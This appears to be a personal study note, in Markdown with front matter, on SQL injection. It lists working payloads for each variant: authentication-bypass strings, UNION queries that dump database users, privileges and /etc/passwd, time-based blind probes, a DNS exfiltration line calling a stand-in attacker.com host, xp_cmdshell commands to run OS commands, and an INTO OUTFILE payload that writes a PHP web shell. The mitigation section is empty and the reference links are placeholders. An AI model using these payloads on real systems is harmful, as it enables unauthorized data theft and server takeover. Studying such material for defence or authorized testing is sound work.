---
category: technique
subjects:
  - cybersec
full_form: SQL Injection
acronym: SQLi
cwe:
  - NULL
vector: remote
privileges: unauthenticated
target: webapp
platform:
  - NULL
intent:
  - NULL
---
## Definition
Injection of commands to subvert an SQL database query

```mysql
select version(); -- retrieve DBMS version
select system_user(); -- retrieve current username and host from the session
show databases; -- list databases
```

```mssql
SELECT @@version; -- retrieve DBMS version
SELECT name FROM sys.databases; -- list databases
SELECT * FROM DATABASE.information_schema.tables;  -- list database tables
select * from DATABASE.dbo.TABLE; -- retrieve contents from a table
```

- In-band
	- Error-based
	- Union-based
- Blind
	- Boolean-based
	- Time-based
- Out-of-band

### Error-based
Exploit returned error messages. The 2nd faster method, only behind the union-based for having a size limit
allows for:
- boolean evaluation subversion (authentication bypass, entries dumping):
	- `%' OR 1=1 -- //`
- sensitive information disclosure and data exfiltration:
	- `%' OR 1=1 IN (SELECT @@version) -- //`

### Union-based
Exploiting the UNION to execute an extra SELECT and concatenate both queries. Depends on the satisfaction of two conditions:
1. The injected query must include the same amount of columns as the original
2. The data types must be compatible between each column

- To find out how many columns a query returns, we may use `%' ORDER BY 1 -- //` and increase the number until it returns an error. Considering that with six it returns an error, we understand that the query returns five columns, and we can inject the second query
	- `' UNION SELECT null, database(), user(), @@version, null -- //`
	- `' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema = database() -- //`
	- `' UNION SELECT null, user, super_priv, null, null FROM mysql.user -- //`
	- `' UNION SELECT null, grantee, privilege_type, null, null FROM information_schema.user_privileges WHERE grantee = user() -- //`
	- `' UNION SELECT null, LOAD_FILE("/etc/passwd"), null, null, null -- //`
	- `' UNIONE SELECT null, variable_name, variable_value, null, null FROM information_schema.global_variables -- //`

### Blind
When database responses are never returned to us, we can analytically infer information based on the application behavior when boolean-based or time-based logic are injected
- Commonly, the boolean-based comes from the web application behavior, but the time-based targets the [[DBMS]] directly:
- possible to enumerate valid values for the vulnerable parameter:
	- `VALUE' AND 1=1 -- //`
	- `VALUE' AND IF (1=1, sleep(3),'false') -- //`

### Inline Queries
Is the least common for needing the query to be written in a very specific way:
- `SELECT ($INPUT) FROM table`

### Out-of-band
The most complex, used when all other types are either unsupported by the vulnerable web application or are too slow. It's based on requesting queries through DNS traffic
- `LOAD_FILE(CONCAT("\\\\",@@version,".attacker.com\\README.txt"))`

### Command Execution
Highly depends on the platform OS and running [[DBMS]], but generally needs the option of code execution to be on, then allowing for OS shell commands to be executed:
- `EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXECUTE xp_cmdshell 'whoami';`
In MySQL or other restrictive [[DBMS]] that does not allow for OS shell commands, we can abuse the DB user's file system permissions to perform arbitrary write:
- `' UNION SELECT "<?php system($_REQUEST['cmd']); ?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/shell.php"`

### Notes
- typically occurs when a web application is not sanitizing the input
- Aside from the time-based blind injection, SQLi targets the database itself, but the protection against it comes from the web application
- Having the adequate permissions, it is possible to perform arbitrary read and write into files

## Discovery

## Execution

## Mitigation

## Evasion

## Relevant Reading
- [TNNNN - NAME](https://attack.mitre.org/techniques/TNNNN)
- [TANNNN - NAME](https://attack.mitre.org/tactics/TANNNN)
- [MNNNN - NAME](https://attack.mitre.org/mitigations/MNNNN)
- [Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [EDB-ID XXXXXX](https://www.exploit-db.com/)
